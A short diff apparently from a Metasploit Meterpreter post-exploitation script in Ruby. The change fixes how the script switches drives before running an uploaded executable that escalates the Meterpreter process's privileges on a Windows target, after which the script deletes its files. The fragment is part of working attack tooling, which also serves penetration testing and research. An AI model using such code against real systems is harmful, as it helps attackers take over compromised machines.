@@ -76,7 +76,8 @@ server = client.sys.process.open
 print_status("Escalating our process (PID:#{server.pid})...")
 print_line("")
 
-data = m_exec(client, "cmd.exe /c cd \"#{tempdir}\" & #{tempexe} #{server.pid}")
+tempdrive = tempdir.split(':')[0]
+data = m_exec(client, "cmd.exe /c #{tempdrive}: & cd \"#{tempdir}\" & #{tempexe} #{server.pid}")
 print_line(data)
 
 print_status("Deleting files...")
